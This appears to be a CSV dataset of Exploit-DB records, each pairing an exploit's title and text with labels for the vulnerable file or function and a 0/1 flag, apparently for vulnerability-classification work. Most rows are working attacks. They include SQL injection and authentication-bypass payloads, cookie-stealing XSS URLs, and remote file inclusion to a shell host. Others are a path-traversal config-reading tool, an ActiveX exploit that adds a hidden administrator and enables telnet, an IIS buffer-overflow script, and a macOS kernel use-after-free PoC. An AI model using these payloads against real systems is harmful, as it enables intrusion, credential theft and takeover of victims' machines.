23400,"Microsoft Outlook Express 6.0 - '.MHTML' Forced File Execution (1) source: https://www.securityfocus.com/bid/9105/info  A vulnerability has been discovered in Microsoft Outlook Express when handling MHTML file and res URIs that could lead to an unexpected file being downloaded and executed.  The problem occurs due to the component failing to securely handle MHTML file URIs that reference a non-existent resource. The affected Outlook Express component is used by Microsoft Internet Explorer. As a result, a victim browser user may inadvertently access a page designed to load an embedded object from a malicious location. This would effectively result in the execution of attacker-supplied code within the Local Zone. The vulnerability is present even if Microsoft Outlook has been removed as the default email client.  According to Microsoft, Microsoft Internet Explorer on Windows Server 2003 is prone to attacks despite its specialized configuration.  Microsoft Windows platforms running Microsoft Outlook Express 5.5SP2, 6.0, and 6.0SP1 are reported by the vendor to be affected though the issue may also be present in earlier versions of Microsoft Outlook Express.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/23400.zip",['MHTML'],1
2677,"Netref 4 - 'cat_for_aff.php' Source Code Disclosure <% Response.Buffer = True %> <% On Error Resume Next %> <% Server.ScriptTimeout = 100 %>  <% '=============================================================================================== '                          =>option.php Reader '[Script Name: Netref 4 (cat_for_aff.php) Source Code Disclosure '[Coded by   : ajann '[Author   : ajann '[Contact    : :( '[ExploitName: exploit4.asp  '[Note : exploit file name =>exploit4.asp '[Note : http://[target]/[path]/script/cat_for_aff.php?ad_direct=../etc/passwd    |etc... '[Using : Write Target after Submit Click '===============================================================================================  %>  <% function guvenlik(username) guvenlik = Replace(username,"" // Adresse du serveur MySQL"","""") guvenlik = Replace(guvenlik,"" // Nom d'utilisateur de la base MySQL "","""") guvenlik = Replace(guvenlik,"" // Nom d'utilisateur MySQL"","""") guvenlik = Replace(guvenlik,"" //Mot de passe MySQL"","""") guvenlik = Replace(guvenlik,"" // Nom de la base MySQL"","""") guvenlik = Replace(guvenlik,"" // Nom d'utilisateur de la base"","""") guvenlik = Replace(guvenlik,"" MySQL"","""") End Function %>  <html> <title>Netref 4 (cat_for_aff.php) Source Code Disclosure</title> <head>  <script language=""JavaScript"">       function functionControl1(){           setTimeout(""functionControl2()"",2000);          }        function functionControl2(){               if(document.form1.field1.value==""""){          alert(""[Exploit Failed]=>The Username and Password Didnt Take,Try Again"");                                       }                           }    function writetext() {              if(document.form1.field1.value==""""){ document.getElementById('htmlAlani').innerHTML='<font face=\""Verdana\"" size=\""1\"" color=\""#008000\"">There is a problem... The Data Didn\'t Take </font>'                              }                  }   function write(){           setTimeout(""writetext()"",1000);          }      </script>   </head> <meta http-equiv=""Content-Type"" content=""text/html; charset=windows-1254""> <body bgcolor=""#000000"" link=""#008000"" vlink=""#008000"" alink=""#008000"">  <center> <font face=""Verdana"" size=""2"" color=""#008000""><b><a href=""exploit4.asp"">Netref </b>v4 (cat_for_aff.php) <u><b> Source Code Disclosure</b></u></a></font><br><br> <table border=""1"" cellpadding=""0"" cellspacing=""0"" style=""border-collapse: collapse"" width=""35%"" id=""AutoNumber1"" bordercolorlight=""#808080"" bordercolordark=""#008000"" bordercolor=""#808080"">   <tr>     <td width=""50%"" bgcolor=""#808000"" onmouseover=""javascript:this.style.background='#808080';"" onmouseout=""javascript:this.style.background='#808000';"">     <font face=""Arial"" size=""1""><b><font color=""#FFFFFF"">TARGET:</font>Example:[http://x.com/path]</b></font><p>     </td>     <td width=""50%""><center> <form method=""post"" name=""form1"" action=""exploit4.asp?islem=get""> <input type=""text"" name=""text1"" value=""http://"" size=""25"" style=""background-color: #808080""> <input type=""submit"" value=""Get""></center></td>   </tr>  </table>  <div id=htmlAlani></div>  <% islem = Request.QueryString(""islem"")     If islem = ""hata1"" Then  Response.Write ""<font face=""""Verdana"""" size=""""1"""" color=""""#008000"""">There is a problem! Please complete to the whole spaces</font>"" End If If islem = ""hata2"" Then  Response.Write ""<font face=""""Verdana"""" size=""""1"""" color=""""#008000"""">There is a problem! Please right character use</font>"" End If If islem = ""hata3"" Then  Response.Write ""<font face=""""Verdana"""" size=""""1"""" color=""""#008000"""">There is a problem! Add """"http://""""</font>"" End If %>  <%    If islem = ""get"" Then  string1=""/script"" string2=""/cat_for_aff.php?"" string3=""ad_direct=."" string4=""./option"" string5="".php%0"" string6=""0""  targettext = Request.Form(""text1"") arama=InStr(1, targettext, ""union"" ,1) arama2=InStr(1, targettext, ""http://"" ,1)  If targettext="""" Then Response.Redirect(""exploit4.asp?islem=hata1"")  Else If arama>0 then  Response.Redirect(""exploit4.asp?islem=hata2"")  Else If arama2=0 then  Response.Redirect(""exploit4.asp?islem=hata3"")  Else %>   <%  target1 = targettext+string1+string2+string3+string4+string5+string6  Public Function take(come) Set objtake = Server.CreateObject(""Microsoft.XMLHTTP"" ) With objtake   .Open ""GET"" , come, FALSE   .sEnd take =  .Responsetext End With SET objtake = Nothing End Function  get_username = take(target1)  getdata=InStr(get_username,""<?"" ) username=Mid(get_username,getdata+3,180)   %>   <center> <font face=""Verdana"" size=""2"" color=""#008000""> <u><b> ajann<br></b></u></font> <table border=""1"" cellpadding=""0"" cellspacing=""0"" style=""border-collapse: collapse"" width=""35%"" id=""AutoNumber1"" bordercolorlight=""#808080"" bordercolordark=""#008000"" bordercolor=""#808080"">   <tr>     <td width=""50%"" bgcolor=""#808000"" onmouseover=""javascript:this.style.background='#808080';"" onmouseout=""javascript:this.style.background='#808000';"">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;     <b><font size=""2"" face=""Arial"">Data:</font></b></td>     <td width=""80%""> &nbsp;<b><font color=""#C0C0C0"" size=""2"" face=""Verdana""><%=guvenlik(username)%></b></font></p>  </td>   </tr>    </table>  <form method=""POST"" name=""form2"" action=""#"">     <input type=""hidden"" name=""field1"" size=""20"" value=""<%=username%>""></p>       </form>   </center>  <script language=""JavaScript""> write() functionControl1() </script>  </body> </html>  <% End If End If End If End If Set objtake = Nothing  %>  # milw0rm.com [2006-10-29]","[""'cat_for_aff.php'""]",1
37804,minimal Gallery - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/55577/info  minimal Gallery is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  minimal Gallery 0.8.1 is vulnerable; other versions may also be affected.   htp://www.example.com/index.php?c=[XSS] htp://www.example.com/PAth/index.php?s=[XSS] htp://www.example.com/PAth/index.php?s=y&id=[XSS] htp://www.example.com/PAth/index.php?m=[XSS] htp://www.example.com/PAth/index.php?d=[XSS],"[""'index.php'""]",1
35489,"Perl 5.x - 'Perl_reg_numbered_buff_fetch()' Remote Denial of Service source: https://www.securityfocus.com/bid/47006/info  Perl is prone to a remote denial-of-service vulnerability.  An attacker can exploit this issue to cause an application implemented with affected perl code to abort, denying service to legitimate users.   #!/usr/bin/perl   my @x = (""A=B"",""AAAA=/""); utf8::upgrade $_ for @x; $x[1] =~ s{/\s*$}{}; for (@x) { m{^([^=]+?)\s*=.+$}; }","[""'Perl_reg_numbered_buff_fetch()'""]",1
6051,"Maian Music 1.0 - Insecure Cookie Handling Author: Saime Date: July 12, 2008 Script: Maian Music v1.0 Insecure Cookie Handling Vulnerability URL: http://www.maianscriptworld.co.uk Dork: Maian Music v1.0. Copyright Â© 2007-2008 Maian Script World. All Rights Reserved.  Description: Maian Music v1.0 is suffering from insecure cookie handling, the /admin/index.php only checks if cookie mmusic_cookie, equals admin username.(md5)  Exploit: javascript:document.cookie = ""mmusic_cookie=21232f297a57a5a743894a0e4a801fc3; path=/php/demos/music/admin/""  Note: The cookie value must be md5(the username). For example, 21232f297a57a5a743894a0e4a801fc3 = admin  # milw0rm.com [2008-07-12]",['/admin/index.php'],1
24356,"Moodle 1.x - 'post.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/10884/info  It is reported that Moodle is vulnerable to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamic web content.  This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and would allow for theft of cookie-based authentication credentials or other attacks.  Versions of Moodle prior to 1.3.4 are reported susceptible to this vulnerability.  http://www.example.com/moodle/mod/forum/post.php?reply=%3Cscript%3Ealert(document.cookie);%3C/script%3E","[""'post.php'""]",1
34690,@Mail 6.1.9 - 'MailType' Cross-Site Scripting source: https://www.securityfocus.com/bid/43377/info  @Mail is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary JavaScript code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  @Mail 6.1.9 is vulnerable; prior versions may also be affected.  http://www.example.com/index.php/mail/auth/processlogin?emailName=&lt;emailName&gt;&amp;emailDomain=&lt;emailDomain&gt;&amp;cssStyle=original&amp;email=&lt;email&gt;password=&lt;password&gt;&amp;requestedServer=&amp;MailType=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,"[""'MailType'""]",1
2121,"Torbstoff News 4 - 'pfad' Remote File Inclusion #================================================================= #Torbstoff News 4 <= (pfad) Remote File Inclusion Exploit #================================================================ #                                                                | #Critical Level : Dangerous                                      | #                                                                | #Venedor site : http://www.torbstoff.de                          | #                                                                | #Version : 4                                                     | #                                                                | #================================================================= # #Dork: ""Torbstoff News 4"" # #================================================================= #Bug in : news.php # #Vlu Code : # #       include($pfad . ""includes/config.inc.php""); # #================================================================= # #Exploit : #-------------------------------- # #http://sitename.com/[Script Path]/news.php?pfad=http://SHELLURL.COM? # #=============================================================================== #Discoverd By : SHiKaA # #Conatact : SHiKaA-[at]hotmail.com # #GreetZ : Bl@Ck^B1rd Semsemmasr Black_Scorpion Medo_Ye7ya Kambaa  NANA Kashtawa #Skiing Gendiaaa Saw AzIZa SnIpEr_Sa Masry OSA FEGLA 3amer =================================================================  # milw0rm.com [2006-08-07]","[""'pfad'""]",1
11920,"Joomla! Component com_personal - SQL Injection # Title : Joomla Component com_personal SQL Injection Vulnerability # Author: DevilZ TM # Data  : 2010-03-28  [~]######################################### InformatioN #############################################[~]   [~] Title     : Joomla Component com_personal SQL Injection Vulnerability [~] Author    : DevilZ TM By D3v1l [~] Homepage  : http://www.DEVILZTM.com [~] Email     : Expl0it@DevilZTM.Com [~] Contact   : D3v1l.blackhat@yahoo.com   [~]#########################################   ExploiT   #############################################[~]   [~] Vulnerable File :   http://127.0.0.1/index.php?option=com_personal&pid=56&id=[SQL]   [~] ExploiT         :   -1 UNION SELECT 1,2,3,4   [~] Example         :   http://127.0.0.1/index.php?option=com_personal&pid=56&id=-1 UNION SELECT 1,2,3,4   [~]######################################### ThankS To ... ############################################[~]   [~] Special Thanks To My Best FriendS :   Exim0r , Raiden , b3hz4d , PLATEN , M4hd1 , Net.Edit0r , Amoo Arash , r3d-r0z AND All Iranian HackerS   [~] IRANIAN Young HackerZ   [~]#########################################   FinisH :D   #############################################[~]",['index.php?'],1
38241,"Pligg CMS 2.0.2 - 'load_data_for_search.php' SQL Injection # Exploit Title: Pligg CMS 2.0.2 SQL injection # Date: 29-08-2015 # Exploit Author: jsass # Vendor Homepage: http://pligg.com # Software Link: https://github.com/Pligg/pligg-cms/archive/2.0.2.zip # Version: 2.0.2 # Tested on: kali sana 2.0  ################ Q8 Gray Hat Team ################    SQLInjection  File : load_data_for_search.php    $search = new Search(); 	 	if(isset($_REQUEST['start_up']) and $_REQUEST['start_up']!= '' and $_REQUEST['pagesize'] != ''){ 		 		$pagesize = $_REQUEST['pagesize']; 		$start_up = $_REQUEST['start_up']; 		$limit = "" LIMIT $start_up, $pagesize"";	 	} 	if(isset($_REQUEST['sql']) and $_REQUEST['sql']!= ''){ 		$sql = $_REQUEST['sql']; 		$search->sql = $sql.$limit; 	} 	 	$fetch_link_summary = true; 	$linksum_sql = $sql.$limit;  Exploit : http://localhost/pligg-cms-master/load_data_for_search.php?sql={SQLi}  Type Injection : Boolean & Time Based   Use SQLmap To Inject ..  Demo : http://www.pligg.science/load_data_for_search.php?sql={SQLi}   ################ Q8 Gray Hat Team ################  Great's To : sec4ever.com && alm3refh.com","[""'load_data_for_search.php'""]",1
3806,"EsForum 3.0 - 'forum.php?idsalon' SQL Injection ------------------------------------------------------------------------------------------------------------------- AYYILDIZ.ORG PreSents...   Script: EsForum 3.0 Script Download: http://www.editeurscripts.com/scripts/dl-esforum-3.html Contact: ilker Kandemir <ilkerkandemir[at]mynet.com>  info: */  MEFISTO Begins. */  ------------------------------------------------------------------------------------------------------------------- Exploit:  forum.php?idsalon='/**/UNION/**/SELECT/**/0,1,2,3,4,user_password,6/**/FROM/**/esforum_users%20where%20user_id=1/*  -------------------------------------------------------------------------------------------------------------------   Tnx:H0tturk,Dr.Max Virus,Gencnesil,CodeR,Ajann Special Tnx: AYYILDIZ.ORG  # milw0rm.com [2007-04-26]","[""'forum.php?idsalon'""]",1
4357,"Telecom Italy Alice Messenger - Remote Registry Key Manipulation <!-- 04.50 20/08/2007 Telecom Italy Alice Messenger Hp.Revolution.RegistryManager.dll (v.1) remote arbitrary registry key manipulation  I mean this one: http://aiuto.alice.it/offerte/messenger/installazione.html  this was 0day for a while, but ... who knows? the new version suggests to remove this dll, you know telecom guy, because it sucks...  Object Safety report:  RegKey Safe for Script: False RegKey Safe for Init: False Implements IObjectSafety: True IDisp Safe:  Safe for untrusted: caller,data  rgod. http://retrogod.altervista.org --> <html> <object classid='clsid:19092490-676B-4C06-A158-34F1CD2DE517' id='HPRevolutionRegistryManager' /></OBJECT> <script language='vbscript'> group=""HKEY_LOCAL_MACHINE"" section=""SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" key=""sun-tzu"" valType=1 'REG_SZ value=""""""c:\windows\system32\cmd.exe"""" /c net user sun tzu /add & net localgroup Administrators sun /add & sc config SharedAccess start= disabled & net stop SharedAccess & sc config TlntSvr start= auto & net start TlntSvr & echo whatthefuck(!) & pause"" 'you meretrix... HPRevolutionRegistryManager.WriteRegistry group ,section ,key ,valType ,value 'die of miserable death mommy </script> </html>  # milw0rm.com [2007-09-03]",['RegistryManager.dll '],1
38569,"Lokboard - 'index_4.php' PHP Code Injection source: https://www.securityfocus.com/bid/60459/info  Lokboard is prone to a remote PHP code-injection vulnerability.  An attacker can exploit this issue to inject and execute arbitrary PHP code in the context of the affected application. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.  Lokboard 1.1 is vulnerable; other versions may also be affected.   POST /lokboard/install/index_4.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/lokboard/install/index_3.php?error=1 Cookie: lang=; PHPSESSID=g4j89f6110r4hpl3bkecfpc7c1 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 90 host=localhost&user=root&pass=toor&name=lokboard&pass_key=1234"";phpinfo();//","[""'index_4.php'""]",1
27034,"OnePlug CMS - '/press/details.asp?Press_Release_ID' SQL Injection source: https://www.securityfocus.com/bid/16155/info  OnePlug CMS is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.   http://www.example.com/press/details.asp?Press_Release_ID=[SQL]","[""'/press/details.asp?Press_Release_ID'""]",1
9204,"MiniCWB 2.3.0 - 'lang' Remote File Inclusion ================================================================================================     [o] MiniCWB 2.3.0 Multiple Remote File Inclusion Vulnerability         Software : MiniCWB version 2.3.0        Vendor   : http://www.grafxsoftware.com/        Download : http://www.grafxsoftware.com/login.php?action=form&url=download.php        Author   : NoGe        Contact  : noge[dot]code[at]gmail[dot]com        Blog     : http://evilc0de.blogspot.com   ================================================================================================     [o] Vulnerable file          include($LANG."".extra.php"");          language/en.inc.php         language/hu.inc.php         language/no.inc.php         language/ro.inc.php         language/ru.inc.php       [o] Exploit         http://localhost/[path]/language/en.inc.php?LANG=[evilc0de]        http://localhost/[path]/language/hu.inc.php?LANG=[evilc0de]        http://localhost/[path]/language/no.inc.php?LANG=[evilc0de]        http://localhost/[path]/language/ro.inc.php?LANG=[evilc0de]        http://localhost/[path]/language/ru.inc.php?LANG=[evilc0de]      [o] Dork         ""Powered by MiniCWB""   ================================================================================================     [o] Greetz         MainHack BrotherHood [ http://news.serverisdown.org ]        Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang        H312Y yooogy mousekill }^-^{ loqsa zxvf        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke      [o] Special         All victim Jakarta Explosion in JW Marriot and The Ritz-Carlton [ Friday July 17 2009 ]        fuck terorism!! you're not make us afraid but you make us more stronger.           ================================================================================================  # milw0rm.com [2009-07-20]","[""'lang'""]",1
44793,"Sitemakin SLAC 1.0 - 'my_item_search' SQL Injection # # # # #  # Exploit Title: SLAC v1.0: Blind SQL Injection / XPath Injection # Date: 29-05-2018 # Vendor Homepage: https://sitemakin.com/login-script-demo # Exploit Author: Divya Jain # Version: v1.0 # CVE: CVE-2018-11535 # Category: Webapps # Severity: High # Tested on: KaLi LinuX_x64 # # # # #  # Proof of Concept:         ////////////////////////////////////////////////           SQL Injection in ""my_item_search"" parameter        ////////////////////////////////////////////////      	# Affected Link: demo.com/login-script-demo/users.php 	 	# Parameter ""my_item_search"" is exploitable using xpath injection 	 	# Payload 1:  	my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e ))-- - 	# Payload 2: 	my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  column_name from information_schema.columns where table_name=""access_level"" LIMIT 0,1),0x7e ))-- - 	 # POC 1 (Result: Table_name) /////////REQUEST//////////  		POST /login-script-demo/users.php HTTP/1.1 		Host: sitemakin.com 		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 		Accept-Language: en-US,en;q=0.5 		Accept-Encoding: gzip, deflate 		Referer: https://demo.com/login-script-demo/users.php 		Content-Type: application/x-www-form-urlencoded 		Content-Length: 171 		Cookie: PHPSESSID=57a62feb015f8912f7eaa856166343db; _ga=GA1.2.496857143.1527491400; _gid=GA1.2.909440178.1527491400; _gat=1 		Connection: close 		Upgrade-Insecure-Requests: 1  		my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e ))-- -&submit=Search  /////////RESPONSE//////////  		<form method=""post"" action=""/login-script-demo/users.php""> 		<select class=""new-url2 form-control"" name=""my_item""> 		<br /> 		<b>Warning</b>:  PDOStatement::execute(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~access_level~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>33</b><br /> 		<br /> 		<b>Warning</b>:  main(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~access_level~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>34</b><br /> 				 <option value=""all"">All</option>    # POC 2 (Result: Column_name) /////////REQUEST//////////  		POST /login-script-demo/users.php HTTP/1.1 		Host: sitemakin.com 		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 		Accept-Language: en-US,en;q=0.5 		Accept-Encoding: gzip, deflate 		Referer: https://demo.com/login-script-demo/users.php 		Content-Type: application/x-www-form-urlencoded 		Content-Length: 175 		Cookie: PHPSESSID=57a62feb015f8912f7eaa856166343db; _ga=GA1.2.496857143.1527491400; _gid=GA1.2.909440178.1527491400; _gat=1 		Connection: close 		Upgrade-Insecure-Requests: 1  		my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  column_name from information_schema.columns where table_name=""access_level"" LIMIT 0,1),0x7e ))-- -&submit=Search  /////////RESPONSE//////////  		<form method=""post"" action=""/login-script-demo/users.php""> 		<select class=""new-url2 form-control"" name=""my_item""> 		<br /> 		<b>Warning</b>:  PDOStatement::execute(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~id~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>33</b><br /> 		<br /> 		<b>Warning</b>:  main(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~id~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>34</b><br /> 				 <option value=""all"">All</option> 				  ################################################################################","[""'my_item_search'""]",1
33067,Winds3D Viewer 3 - 'GetURL()' Arbitrary File Download source: https://www.securityfocus.com/bid/35595/info  Winds3D Viewer is prone to a vulnerability that can allow malicious files to be downloaded an executed within the context of the affected browser that uses the plugin.  Successfully exploiting this issue will allow attackers to compromise the affected application that uses the plugin.  Winds3D Viewer 3.5.0.0 and 3.5.0.5 are vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/33067.usr,"[""'GetURL()'""]",1
36889,Dotclear 2.4.1.2 - '/admin/blogs.php?nb' Cross-Site Scripting source: https://www.securityfocus.com/bid/52221/info   Dotclear is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   Dotclear 2.4.1.2 is vulnerable; prior versions may also be affected.   http://www.example.com/admin/blogs.php?nb=5%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E,"[""'/admin/blogs.php?nb'""]",1
7397,"ProQuiz 1.0 - Authentication Bypass ----------------------------------------------------------------------------------------------------------------------------------------------------------------  [0] GENERAL DETAILS:  Name           :  ProQuiz 1.0 Sql Injection (Auth bypass) Download       :  http://sourceforge.net/project/downloading.php?group_id=246466&use_mirror=kent&filename=ProQuiz.zip&65145754 Vulnerability  :  Sql Injection (Admin Login Bypass) Author         :  Osirys Contact        :  osirys[at]live[dot]it  ----------------------------------------------------------------------------------------------------------------------------------------------------------------  [1] BUG EXPLANATION:  The affected file is /admin/index.php. Let's see the code.  [CODE] if($_GET['menu'] != 'madmin') 	{ 	if(isset($_POST['username']) && isset($_POST['password'])) 		{ 			$query = ""SELECT * FROM "".$member_admin."" WHERE `username` = '"".$_POST['username'].""' AND `password` = '"".$_POST['password'].""' ""; [/CODE]  ----------------------------------------------------------------------------------------------------------------------------------------------------------------  [2] EXPLOITATION:  Just go in /[path]/admin/index.php. Login with the following details: Username : ' or 1=1# Password : anything  ----------------------------------------------------------------------------------------------------------------------------------------------------------------  # milw0rm.com [2008-12-09]",['index.php.'],1
20815,"Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (1) #source: https://www.securityfocus.com/bid/2674/info  #Windows 2000 Internet printing ISAPI extension contains msw3prt.dll which handles user requests. Due to an unchecked buffer in msw3prt.dll, a maliciously crafted HTTP .printer request containing approx 420 bytes in the 'Host:' field will allow the execution of arbitrary code. Typically a web server would stop responding in a buffer overflow condition; however, once Windows 2000 detects an unresponsive web server it automatically performs a restart. Therefore, the administrator will be unaware of this attack.  #* If Web-based Printing has been configured in group policy, attempts to disable or unmap the affected extension via Internet Services Manager will be overridden by the group policy settings.   #!/usr/bin/perl # Exploit By storm@stormdev.net # Tested with sucess against Win2k IIS 5.0 + SP1 # Remote Buffer Overflow Test for Internet Printing Protocol  # This code was written after eEye brought this issue in BugTraq.   use Socket;   print ""-- IPP - IIS 5.0 Vulnerability Test By Storm --\n\n"";  if (not $ARGV[0]) { 	print qq~  		Usage: webexplt.pl <host> 	~;  exit;}   $ip=$ARGV[0];  print ""Sending Exploit Code to host: "" . $ip . ""\n\n""; my @results=sendexplt(""GET /NULL.printer HTTP/1.0\n"" . ""Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n""); print ""Results:\n"";  if (not @results) { 	print ""The Machine tested has the IPP Vulnerability!""; } print @results;  sub sendexplt {         my ($pstr)=@_;  	$target= inet_aton($ip) || die(""inet_aton problems"");         socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                 die(""Socket problems\n"");         if(connect(S,pack ""SnA4x8"",2,80,$target)){                 select(S);               		$|=1;                 print $pstr;             		my @in=<S>;    	        select(STDOUT); 	        close(S);                 return @in;         } else { die(""Can't connect...\n""); } }","['ISAPI extension', 'msw3prt.dll']",1
41165,"Apple macOS 10.12.1 / iOS Kernel - 'host_self_trap' Use-After-Free /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1034  The task struct has a lock (itk_lock_data, taken via the itk_lock macros) which is supposed to protect the task->itk_* ports.  The host_self_trap mach trap accesses task->itk_host without taking this lock leading to a use-after-free given the following interleaving of execution:  Thread A: host_self_trap:   read current_task()->itk_host         // Thread A reads itk_host  Thread B: task_set_special_port:   *whichp = port;                       // Thread B replaces itk_host with eg MACH_PORT_NULL   itk_unlock(task);      if (IP_VALID(old))     ipc_port_release_send(old);         // Thread B drops last ref on itk_host  Thread A: host_self_trap:   passes the port to ipc_port_copy_send // uses the free'd port  host_self_trap should use one of the canonical accessors for the task's host port, not just directly read it.  PoC tested on MacOS 10.12.1 */  // ianbeer #if 0 iOS/MacOS kernel UaF due to lack of locking in host_self_trap  The task struct has a lock (itk_lock_data, taken via the itk_lock macros) which is supposed to protect the task->itk_* ports.  The host_self_trap mach trap accesses task->itk_host without taking this lock leading to a use-after-free given the following interleaving of execution:  Thread A: host_self_trap: 	read current_task()->itk_host         // Thread A reads itk_host  Thread B: task_set_special_port:   *whichp = port;                       // Thread B replaces itk_host with eg MACH_PORT_NULL   itk_unlock(task);      if (IP_VALID(old))     ipc_port_release_send(old);         // Thread B drops last ref on itk_host  Thread A: host_self_trap:   passes the port to ipc_port_copy_send // uses the free'd port  host_self_trap should use one of the canonical accessors for the task's host port, not just directly read it.  PoC tested on MacOS 10.12.1 #endif  // example boot-args // debug=0x144 -v pmuflags=1 kdp_match_name=en3 -zp -zc gzalloc_min=120 gzalloc_max=200  #include <stdio.h> #include <stdlib.h> #include <pthread.h>  #include <mach/mach.h> #include <mach/host_priv.h>  mach_port_t q() {   mach_port_t p = MACH_PORT_NULL;   mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);   mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);   return p; }  int start = 0;  mach_port_t rq = MACH_PORT_NULL; void* racer(void* arg) {   for(;;) {     while(!start){;}     usleep(10);     mach_port_t p = mach_host_self();     mach_port_deallocate(mach_task_self(), p);     start = 0;   } }  int main() {   pthread_t thread;   pthread_create(&thread, NULL, racer, NULL);   for (;;){     mach_port_t p = q();      kern_return_t err = task_set_special_port(mach_task_self(), TASK_HOST_PORT, p);      mach_port_deallocate(mach_task_self(), p);     mach_port_destroy(mach_task_self(), p);     // kernel holds the only ref      start = 1;      task_set_special_port(mach_host_self(), TASK_HOST_PORT, MACH_PORT_NULL);   }   return 0; }","[""'host_self_trap'""]",1
39177,"VideoLAN VLC Media Player 2.1.3 - '.wav' File Memory Corruption source: https://www.securityfocus.com/bid/67315/info  VLC Media Player is prone to a memory-corruption vulnerability.  Attackers can exploit this issue to cause a denial-of-service condition. Due to the nature of this issue, arbitrary code execution may be possible but this has not been confirmed.  VLC Media Player 2.1.3 is vulnerable; other versions may also be affected.   #!/usr/bin/python data = ""\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x7F\xFF\xFF\xFF\x00\x00\x01\x02\x01\x03\x00\x00\x00\xBA\x1B\xD8\x84\x00\x00\x00\x03\x50\x4C\x54\x45\xFF\xFF\xFF\xA7\xC4\x1B\xC8\x00\x00\x00\x01\x74\x52\x4E\x53\x00\x40\xE6\xD8\x66\x00\x68\x92\x01\x49\x44\x41\x54\xFF\x05\x3A\x92\x65\x41\x71\x68\x42\x49\x45\x4E\x44\xAE\x42\x60\x82"" outfile = file(""poc.wave"", 'wb') outfile.write(data) outfile.close() print ""Created Poc""","[""'.wav'""]",0
